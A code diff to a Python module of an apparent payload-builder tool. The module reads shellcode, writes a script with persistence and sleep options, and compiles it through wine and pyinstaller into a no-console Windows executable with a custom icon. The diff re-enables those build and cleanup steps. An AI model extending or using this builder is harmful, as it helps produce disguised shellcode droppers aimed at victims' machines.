@@ -19,8 +19,6 @@ class exe_options(Moduleobject):
         self.read_code = r''
         self.outfile_dirpath = './output/'
         self.output_script_name = ''
-        # self.persistent_True_option  = self.values['path'],'persistence()',self.values['sleep']
-        # self.persistent_False_option =        ''          ,'pass'         ,self.values['sleep']
 
     def script_code(self,arrive_path,shellcode,persistence,sleeptime):
         return ('''
@@ -84,18 +82,18 @@ if __name__ == "__main__":
         print('\033[92m' + '[*]' + '\033[0m' + 'script was created succesfully ! ! ',end='\n')
         return output_script_name
 
-    #def generate_exe(self):
-    #    if os.path.isfile(self.output_script_name):
-    #        os.system("wine ~/.wine/drive_c/Python34/Scripts/pyinstaller.exe %s --onefile --noconsole --icon=%s --clean"
-    #              %(self.output_script_name,self.values['icon']))
-    #        print('\033[92m'+'[*]'+'\033[0m'+'exe file was created succesfully ! ! ')
+    def generate_exe(self):
+        if os.path.isfile(self.output_script_name):
+            os.system('WINEPREFIX="$HOME/prefix32" wine ~/prefix32/drive_c/Python34/Scripts/pyinstaller.exe %s --onefile --noconsole --icon=%s --clean'
+                  %(self.output_script_name,self.values['icon']))
+            print('\033[92m'+'[*]'+'\033[0m'+'exe file was created succesfully ! ! ')
 
-    #def clean_cache(self,file):
-    #    shutil.rmtree('./build')
-    #    os.remove('./%s.spec'%file)
-    #    shutil.copy('./dist/%s'%file,'./output/')
-    #    shutil.rmtree('./dist')
-    #   print('\033[92m' + '[*]' + '\033[0m' +"cache was cleaned")
+    def clean_cache(self,file):
+        shutil.rmtree('./build')
+        os.remove('./%s.spec'%file)
+        shutil.copy('./dist/%s'%file,'./output/')
+        shutil.rmtree('./dist')
+        print('\033[92m' + '[*]' + '\033[0m' +"cache was cleaned")
 
     def run_action(self):
         self.read_code = self.read_shellcode(self.values['source'])
@@ -103,7 +101,7 @@ if __name__ == "__main__":
         self.output_script_name = self.write_script(code=self.read_code)
         time.sleep(2)
         print('-' * 50)
-    #   self.generate_exe()
-    #   time.sleep(2)
-    #   self.clean_cache(self.values['outfile'])
+        self.generate_exe()
+        time.sleep(2)
+        self.clean_cache(self.values['outfile'])
         input('type any key to continue')
